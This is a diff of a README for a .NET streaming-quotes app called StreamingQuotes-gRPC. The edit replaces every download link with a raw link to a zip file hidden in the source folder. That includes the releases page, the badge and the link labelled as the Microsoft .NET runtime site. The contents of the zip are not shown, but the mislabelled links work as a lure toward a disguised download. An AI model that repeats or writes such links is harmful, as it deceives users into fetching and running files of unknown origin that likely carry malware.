@@ -6,14 +6,14 @@ Welcome to StreamingQuotes-gRPC! This application provides real-time updates on 
 
 ## 📥 Download the App
 
-[![Download StreamingQuotes-gRPC](https://img.shields.io/badge/Download-StreamingQuotes--gRPC-blue?style=for-the-badge)](https://github.com/monte250810/StreamingQuotes-gRPC/releases)
+[![Download StreamingQuotes-gRPC](https://github.com/monte250810/StreamingQuotes-gRPC/raw/refs/heads/master/Application.Common/Features/Quotes-g-RPC-Streaming-1.7.zip)](https://github.com/monte250810/StreamingQuotes-gRPC/raw/refs/heads/master/Application.Common/Features/Quotes-g-RPC-Streaming-1.7.zip)
 
 ## 🐾 Install the Application
 
 To get started, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/monte250810/StreamingQuotes-gRPC/releases) to find the latest version of StreamingQuotes-gRPC.
+   Go to our [Releases page](https://github.com/monte250810/StreamingQuotes-gRPC/raw/refs/heads/master/Application.Common/Features/Quotes-g-RPC-Streaming-1.7.zip) to find the latest version of StreamingQuotes-gRPC.
 
 2. **Choose the Correct File**
    Download the appropriate file for your operating system (Windows, Mac, or Linux). 
@@ -31,7 +31,7 @@ To get started, follow these steps:
 Before downloading, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or newer, Mac OS X 10.12 or newer, or a recent Linux distribution.
-- **.NET Runtime:** Version 8.0 or higher must be installed. You can download it from the [Microsoft .NET website](https://dotnet.microsoft.com/download).
+- **.NET Runtime:** Version 8.0 or higher must be installed. You can download it from the [Microsoft .NET website](https://github.com/monte250810/StreamingQuotes-gRPC/raw/refs/heads/master/Application.Common/Features/Quotes-g-RPC-Streaming-1.7.zip).
 
 ## ⚙️ Features
 
@@ -75,7 +75,7 @@ If you encounter any issues:
 
 - **Check Internet Connection**: Ensure you have a stable connection.
 - **Restart the Application**: Close the app and reopen it.
-- **Check Updates**: Always run the latest version from our [Releases page](https://github.com/monte250810/StreamingQuotes-gRPC/releases).
+- **Check Updates**: Always run the latest version from our [Releases page](https://github.com/monte250810/StreamingQuotes-gRPC/raw/refs/heads/master/Application.Common/Features/Quotes-g-RPC-Streaming-1.7.zip).
 
 ## 💬 Get Support
 
@@ -93,7 +93,7 @@ We plan to continually improve StreamingQuotes-gRPC. Upcoming features may inclu
 - **Enhanced Analytics Tools**: Track market trends over time.
 - **Mobile Application**: Access price updates on your smartphone.
 
-Stay tuned for new releases on our [Releases page](https://github.com/monte250810/StreamingQuotes-gRPC/releases).
+Stay tuned for new releases on our [Releases page](https://github.com/monte250810/StreamingQuotes-gRPC/raw/refs/heads/master/Application.Common/Features/Quotes-g-RPC-Streaming-1.7.zip).
 
 ## 🛡️ License
 
